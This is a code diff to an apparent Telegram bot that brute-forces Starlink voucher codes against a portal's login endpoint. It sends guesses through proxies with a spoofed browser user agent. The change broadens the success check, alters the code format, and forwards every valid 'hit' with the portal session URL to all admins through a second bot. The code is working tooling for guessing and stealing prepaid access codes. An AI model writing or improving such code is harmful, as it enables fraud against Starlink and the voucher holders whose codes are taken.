@@ -54,7 +54,8 @@ async def verify_hit(session_url, code):
             headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
             async with ts.post(post_url, json=data, headers=headers, proxy=proxy) as p_req:
                 resp_text = await p_req.text()
-                if 'logonUrl' in resp_text:
+                # Success Response အပြည့်အစုံ စစ်ဆေးရန်
+                if any(k in resp_text.lower() for k in ['logonurl', 'success', 'code":0', 'redirect']):
                     return True
         except Exception:
             pass
@@ -87,31 +88,26 @@ async def perform_check(session_url, code, chat_id, semaphore):
                 headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
                 async with ts.post(post_url, json=data, headers=headers, proxy=proxy) as p_req:
                     resp_text = await p_req.text()
-                    if 'logonUrl' in resp_text:
+                    
+                    # တွေ့ရှိပါက အတည်ပြုပြီး Admin ထံသို့ ပို့မည်
+                    if any(k in resp_text.lower() for k in ['logonurl', 'success', 'code":0', 'redirect']):
                         is_valid = await verify_hit(session_url, code)
                         if not is_valid: return False
 
                         hit_msg = (
                             f"🚨 **STARLINK VOUCHER HIT!** 🚨\n\n"
                             f"👤 **User ID:** `{chat_id}`\n"
-                            f"🎫 **Code:** `3000{code}`\n"
+                            f"🎫 **Code:** `{code}`\n"
                             f"🔗 **Portal URL:**\n{session_url}"
                         )
                         
-                        # User ထံသို့ ပေးပို့ရန်
-                        await bot.send_message(chat_id, f"✅ **Success Code Hit!**\n\n🎫 Code: `3000{code}`")
+                        await bot.send_message(chat_id, f"✅ **Success Code Hit!**\n\n🎫 Code: `{code}`")
                         
-                        # Forward Bot မှတစ်ဆင့် Admin များအားလုံးထံသို့ ပေးပို့ရန်
                         for admin_id in ADMINS:
                             try:
                                 await forward_bot.send_message(admin_id, hit_msg, parse_mode="Markdown")
                             except Exception:
                                 pass
-                        try:
-                            await forward_bot.send_message(ADMINS[0], hit_msg, parse_mode="Markdown")
-                        except Exception:
-                            pass
-                            
                         return True
             except Exception:
                 pass
@@ -306,3 +302,4 @@ async def main():
 
 if __name__ == '__main__':
     asyncio.run(main())
+
